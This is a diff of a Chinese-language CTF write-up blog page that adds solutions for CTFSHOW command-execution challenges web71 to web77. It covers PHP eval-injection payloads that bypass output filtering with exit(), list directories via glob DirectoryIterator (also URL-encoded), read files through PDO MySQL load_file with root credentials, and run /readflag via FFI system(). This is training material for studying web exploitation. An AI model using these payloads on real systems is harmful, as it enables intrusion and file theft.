@@ -24,7 +24,7 @@
 <meta property="og:description" content="CTFSHOW-命令执行篇web291234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &amp;#12">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-07-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-07-17T14:14:34.265Z">
+<meta property="article:modified_time" content="2024-07-20T04:31:53.920Z">
 <meta property="article:author" content="piiick">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.2k 字
+          4.5k 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          35 分钟
+          38 分钟
         
       </span>
     
@@ -453,6 +453,31 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">题面一样但是print_r被禁了，换成 var_dump即可<br>c=var_dump(scandir(&quot;/&quot;));<br>c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure>
 
 <h3 id="web68-web70"><a href="#web68-web70" class="headerlink" title="web68-web70"></a>web68-web70</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require<br><br>payload: c=var_dump(scandir(&quot;/&quot;));include(&quot;/flag.txt&quot;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>你要上天吗？<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">$s = ob_get_contents();//得到缓冲区的数据。<br>ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。<br><br>可以利用exit9);停止后面的程序<br><br>payload：c=require(&quot;/flag.txt&quot;);exit()<br></code></pre></td></tr></table></figure>
+
+<h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16846015.html">ctfshow web72(绕过open_basedir) - hithub - 博客园 (cnblogs.com)</a></p>
+<h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p><strong>glob</strong>遍历目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>url编码</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">c=%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#x27;%20&#x27;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<br></code></pre></td></tr></table></figure>
+
+<p>得到flag.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure>
+
+<p>拿flag</p>
+<h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>同web73</p>
+<h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p><strong>glob</strong>遍历目录先得到文件名flag35.txt</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>=%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span>DirectoryIterator(%<span class="hljs-number">22</span>glob%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F*%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>a%<span class="hljs-number">20</span>as%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>Becho(%<span class="hljs-number">24</span>f-%<span class="hljs-number">3</span>E__toString().&#x27;%<span class="hljs-number">20</span>&#x27;)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aexit(<span class="hljs-number">0</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+
+<p>然后利用PDO连接数据库load_file读取文件</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,<br>&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)<br>&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-<br>&gt;getMessage();exit(0);&#125;exit(0);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>同web75，文件名为flag36.txt</p>
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">c=<span class="hljs-variable">$ffi</span> = <span class="hljs-title function_">FFI::cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span><span class="hljs-comment">;</span><br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-params">system</span>(<span class="hljs-variable">$a</span>)<span class="hljs-comment">;</span><br>访问<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
 
 
                 
